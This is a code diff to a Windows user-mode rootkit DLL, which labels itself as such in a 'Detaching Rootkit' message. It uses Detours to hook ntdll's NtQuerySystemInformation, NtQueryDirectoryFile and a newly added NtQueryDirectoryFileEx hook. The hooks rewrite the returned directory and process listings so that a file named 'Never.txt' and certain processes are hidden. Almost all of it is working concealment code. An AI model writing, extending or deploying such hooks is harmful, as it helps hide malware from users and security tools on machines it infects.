@@ -12,6 +12,7 @@
 fnNtQuerySystemInformation g_NtQuerySystemInformation;
 fnNtQueryDirectoryFile g_NtQueryDirectoryFile;
 fnRtlUnicodeStringToAnsiString g_RtlUnicodeStringToAnsiString;
+fnNtQueryDirectoryFileEx g_NtQueryDirectoryFileEx;
 
 /* ------------------------------------------------------------------------------------------------------ */
 
@@ -48,7 +49,7 @@ NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationCl
                 }
                 else {
                     Previous->NextEntryOffset += Current->NextEntryOffset;
-                    PRINT("(+) PROCESS FOUND\n");
+                    PRINT("(+) NtQuerySystemInformation Used...\n");
                 }
                 Current = Previous;
             }
@@ -86,11 +87,54 @@ NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE
             PFILE_ID_BOTH_DIR_INFO next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)current + current->NextEntryOffset);
 
             // comparing name
-            if (CompareToFileName(next, "hello.txt") == TRUE) {
+            if (CompareToFileName(next, "Never.txt") == TRUE) {
                 if (next->NextEntryOffset != 0) {
                     next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                     current->NextEntryOffset += next->NextEntryOffset;
-                    PRINT("(+) Found File...\n");
+                    PRINT("(+) NtQueryDirectoryFile Used...\n");
+                }
+                else {
+                    current->NextEntryOffset = 0;
+                }
+            }
+            else {
+                current = next;
+            }
+        }
+    }
+    return stat;
+}
+
+NTSTATUS MyNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
+    NTSTATUS stat = g_NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
+    
+    PFILE_FULL_DIR_INFO pFileFullDirInfo;
+    PFILE_FULL_DIR_INFO pFileBothDirInfo;
+
+    if (FileInformationClass == FileFullDirectoryInformation) {
+        pFileFullDirInfo = (PFILE_FULL_DIR_INFO)FileInformation;
+        while (pFileFullDirInfo->NextEntryOffset) {
+            pFileFullDirInfo = (PFILE_FULL_DIR_INFO)((LPBYTE)pFileFullDirInfo + pFileFullDirInfo->NextEntryOffset);
+        }
+    }
+    else if (FileInformationClass == FileBothDirectoryInformation) {
+        pFileBothDirInfo = (PFILE_FULL_DIR_INFO)FileInformation;
+        while (pFileBothDirInfo->NextEntryOffset) {
+            pFileBothDirInfo = (PFILE_FULL_DIR_INFO)((LPBYTE)pFileBothDirInfo + pFileBothDirInfo->NextEntryOffset);
+        }
+    }
+    else if (FileInformationClass == FileIdBothDirectoryInformation) {
+        PFILE_ID_BOTH_DIR_INFO current = (PFILE_ID_BOTH_DIR_INFO)FileInformation;
+
+        while (current->NextEntryOffset) {
+            PFILE_ID_BOTH_DIR_INFO next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)current + current->NextEntryOffset);
+
+            // comparing name
+            if (CompareToFileName(next, "Never.txt") == TRUE) {
+                if (next->NextEntryOffset != 0) {
+                    next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
+                    current->NextEntryOffset += next->NextEntryOffset;
+                    PRINT("(+) NtQueryDirectoryFileEx Used...\n");
                 }
                 else {
                     current->NextEntryOffset = 0;
@@ -128,9 +172,9 @@ VOID InitializeHooks() {
     DetourUpdateThread(GetCurrentThread());
     InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
     InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
+    InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)&g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx);
     DetourTransactionCommit();
-    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile);
-    
+    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile); 
 
 }
 
@@ -140,6 +184,7 @@ VOID UninitializeHooks() {
     DetourUpdateThread(GetCurrentThread());
     Unhook((LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
     Unhook((LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
+    Unhook((LPVOID)&g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx);
     DetourTransactionCommit();
 
 }
@@ -158,6 +203,7 @@ BOOL WINAPI DllMain(HINSTANCE hModule, DWORD  fdwReason, LPVOID lpReserved) {
     }
     if (fdwReason == DLL_PROCESS_DETACH) {
         UninitializeHooks();
+        PRINT("(-) Detaching Rootkit...\n");
     }
 
     return TRUE;
